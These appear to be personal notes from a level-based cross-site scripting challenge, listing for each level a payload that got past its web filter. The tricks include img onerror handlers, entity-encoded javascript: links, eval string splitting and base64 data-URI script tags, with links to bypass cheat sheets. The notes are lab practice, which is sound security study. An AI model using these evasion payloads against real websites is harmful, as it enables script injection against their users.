# Web App Firewall (WAF) Filter evasion

**Level 0 No filter**
`<script>alert(1)</script>`  simple as no checks

**Level 1-3 script filter**
`<img src="dfsdf" onerror="alert(1)" />` smuggle js via image


Works for all


**Level 4 Link (WAF filter: /"/)**
Entered code ends up in a link: `javascript:alert(1)`

**Level 5+6 Link  (/"|javascript/i )**
`j&#97v&#97script&#x3A;&#97lert(1)`

Works for 5 + 6
Something like this using lax browser parsing didnt work: "j a va script...")

**Level 7 Code (/alert/i )**

```
'1';
var b = 'aler';
var c = 't(1)';
eval(b+c);
```

**Level 8 Code**
```
1;</script><script src="data:text/javascript;base64,amF2YXNjcmlwdDphbGVydCgxKQ=="></script>
```

or just  (without javascript)
```
1;</script><script src="data:text;base64,amF2YXNjcmlwdDphbGVydCgxKQ=="></script>
```

**Level 9**
`<a href="javascri&#112t:alert(1)" >hello</a>`  

(generates a link to be clicked, maybe not what was meant)

**Level 10**
no succes :-(

## Notes
https://www.volkis.com.au/blog/bypass-xss-in-wafs/ 
https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/

https://www.w3.org/MarkUp/html-spec/html-spec_13.html